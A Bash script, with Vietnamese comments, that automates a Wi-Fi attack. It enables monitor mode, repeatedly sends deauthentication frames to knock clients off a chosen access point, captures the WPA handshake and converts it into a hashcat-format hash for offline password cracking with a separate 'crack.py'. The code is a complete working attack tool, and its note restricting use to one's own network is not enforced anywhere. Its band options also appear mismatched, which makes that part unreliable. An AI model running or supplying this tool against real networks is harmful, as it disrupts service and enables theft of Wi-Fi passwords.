#!/usr/bin/env bash
# Bắt WPA 4-way handshake bằng airodump-ng + deauth ngắn (mạng của bạn).
# Ví dụ:
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6 11:22:33:44:55:66 60
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 5 "" 60 6   # 6GHz (band 2.4/5/6)
# Lưu ý: thiết bị bật PMF/802.11w có thể bỏ qua deauth — khi đó chờ client tự kết nối lại.
set -euo pipefail
umask 077

if [[ $EUID -ne 0 ]]; then
  echo "[x] chạy bằng sudo" >&2
  exit 1
fi
IFACE="${1:?usage: sudo ./handshake.sh <iface> <bssid> <channel> [client_mac] [seconds] [band]}"
BSSID="${2:?thiếu BSSID}"
CHANNEL="${3:?thiếu channel}"
CLIENT="${4:-}"
TIMEOUT="${5:-45}"
BAND="${6:-}"
GRACE="${HANDSHAKE_GRACE:-8}"
[[ "$GRACE" =~ ^[0-9]+$ ]] || GRACE=8

if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
  echo "[x] BSSID không hợp lệ: $BSSID" >&2
  exit 1
fi
if [[ ! "$CHANNEL" =~ ^[0-9]+$ ]]; then
  echo "[x] channel không hợp lệ: $CHANNEL" >&2
  exit 1
fi
if [[ -n "$CLIENT" && ! "$CLIENT" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
  echo "[x] client MAC không hợp lệ: $CLIENT" >&2
  exit 1
fi
if [[ ! "$TIMEOUT" =~ ^[1-9][0-9]*$ ]]; then
  echo "[x] seconds phải là số nguyên dương: $TIMEOUT" >&2
  exit 1
fi
case "$BAND" in
  ""|2.4|5|6) ;;
  *) echo "[x] band không hợp lệ: $BAND (2.4, 5, 6)" >&2; exit 1 ;;
esac

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="$ROOT/captures"
mkdir -p "$OUT_DIR"
chmod 700 "$OUT_DIR" 2>/dev/null || true
STAMP="$(date +%Y%m%d-%H%M%S)"

for tool in airodump-ng aireplay-ng aircrack-ng; do
  command -v "$tool" >/dev/null || { echo "[x] thiếu $tool. Kali: apt install aircrack-ng" >&2; exit 1; }
done

monitor_list() {
  iw dev 2>/dev/null | awk '/Interface/ {i=$2} /type monitor/ {print i}'
}

restore_iface() {
  local base="$1"
  local protected="$2"
  local mon
  if ! iw dev "$base" info >/dev/null 2>&1; then
    return 0
  fi
  for mon in $(monitor_list); do
    if [[ "$mon" == "$base" ]]; then
      continue
    fi
    if grep -qx "$mon" <<< "$protected"; then
      continue
    fi
    ip link set "$mon" down 2>/dev/null || true
    iw dev "$mon" del 2>/dev/null || true
  done
  if iw dev "$base" info 2>/dev/null | grep -q 'type monitor'; then
    ip link set "$base" down 2>/dev/null || true
    iw dev "$base" set type managed 2>/dev/null || true
  fi
  ip link set "$base" up 2>/dev/null || true
}

airmon-ng check kill >/dev/null 2>&1 || true

OLD_MON="$(monitor_list)"
MON=""
DUMP_PID=""
stop_dump() {
  local pid="${DUMP_PID:-}"
  if [[ -z "$pid" ]]; then
    return 0
  fi
  kill -INT "$pid" 2>/dev/null || true
  for _ in {1..20}; do
    if ! kill -0 "$pid" 2>/dev/null; then
      break
    fi
    sleep 0.1
  done
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  DUMP_PID=""
}

cleanup() {
  stop_dump
  if [[ -n "$MON" ]]; then
    airmon-ng stop "$MON" >/dev/null 2>&1 || true
  fi
  restore_iface "$IFACE" "$OLD_MON"
}
trap cleanup EXIT

airmon-ng start "$IFACE" >/dev/null 2>&1 || true
MON=""
for candidate in $(monitor_list); do
  if ! grep -qx "$candidate" <<< "$OLD_MON"; then
    MON="$candidate"
    break
  fi
done
if [[ -z "$MON" ]]; then
  if iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
    MON="$IFACE"
  else
    echo "[x] không bật được monitor mode trên $IFACE (card/driver không hỗ trợ?)" >&2
    exit 1
  fi
fi

BAND_ARGS=()
case "$BAND" in
  2.4) BAND_ARGS=(--band a) ;;
  5) BAND_ARGS=(--band b) ;;
  6) BAND_ARGS=(--band g) ;;
esac

echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL${BAND:+ (band $BAND)}"

deauth() {
  local count="$1"
  if [[ -n "$CLIENT" ]]; then
    aireplay-ng --deauth "$count" -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1 || true
  else
    aireplay-ng --deauth "$count" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
  fi
}

has_handshake() {
  [[ -n "$CAP" && -f "$CAP" ]] || return 1
  (aircrack-ng "$CAP" 2>/dev/null || true) | grep -qi 'handshake'
}

DEADLINE=$(( $(date +%s) + TIMEOUT ))
ATTEMPT=0
HASH=""

while :; do
  ATTEMPT=$((ATTEMPT + 1))
  if (( ATTEMPT == 1 )); then
    PREFIX="$OUT_DIR/hs-$STAMP"
  else
    PREFIX="$OUT_DIR/hs-$STAMP-r$ATTEMPT"
  fi
  CAP="$PREFIX-01.cap"

  if (( ATTEMPT > 1 )); then
    echo "[*] thử lại capture (lần $ATTEMPT)..."
  fi

  airodump-ng -c "$CHANNEL" --bssid "$BSSID" "${BAND_ARGS[@]}" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
  DUMP_PID=$!

  sleep 5

  echo "[*] deauth để ép client reconnect (chỉ mạng của bạn)"
  deauth 4
  HINT=0
  LAST_DEAUTH=$(date +%s)

  while :; do
    NOW=$(date +%s)
    if (( NOW >= DEADLINE )); then
      break
    fi
    if has_handshake; then
      if (( HINT == 0 )); then
        HINT=$NOW
        echo "[*] thấy EAPOL — chờ thêm ${GRACE}s cho đủ frame..."
        deauth 2
      elif (( GRACE == 0 || NOW - HINT >= GRACE )); then
        break
      fi
    fi
    sleep 1
    NOW=$(date +%s)
    if (( NOW - LAST_DEAUTH >= 10 && NOW < DEADLINE )); then
      deauth 2
      LAST_DEAUTH=$NOW
    fi
  done

  stop_dump

  if ! command -v hcxpcapngtool >/dev/null; then
    break
  fi

  HASH="${CAP%.cap}.hc22000"
  echo "[*] convert → $HASH"
  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30 || true
  if [[ -s "$HASH" ]]; then
    break
  fi
  rm -f "$HASH"
  if (( $(date +%s) >= DEADLINE )); then
    break
  fi
  echo "[!] dump chưa đủ frame để tạo hash — thử lại..."
done

cleanup
trap - EXIT

if ! command -v hcxpcapngtool >/dev/null; then
  if has_handshake; then
    echo "[+] handshake OK (aircrack-ng) → $CAP"
    echo "[!] thiếu hcxpcapngtool — convert trên Windows: hcxpcapngtool -o hs.hc22000 \"$CAP\"  (hcxtools win64)"
    exit 0
  fi
  echo "[-] chưa bắt được handshake trong ${TIMEOUT}s."
  echo "    Thử: client đang kết nối? kênh/band đúng? đứng gần AP hơn? tắt/bật WiFi client? tăng seconds."
  exit 1
fi

if [[ -n "$HASH" && -s "$HASH" ]]; then
  echo "[+] handshake OK → $CAP"
  echo "[+] hash → $HASH"
  echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
  exit 0
fi

echo "[-] chưa tạo được hash trong ${TIMEOUT}s."
echo "    Dump đã giữ: ${CAP:-<không có>}"
echo "    Thử: client đang kết nối? kênh/band đúng? đứng gần AP hơn? tắt/bật WiFi client? tăng seconds."
echo "    Kiểm tra thủ công: hcxpcapngtool -o hs.hc22000 <file.cap>"
exit 1
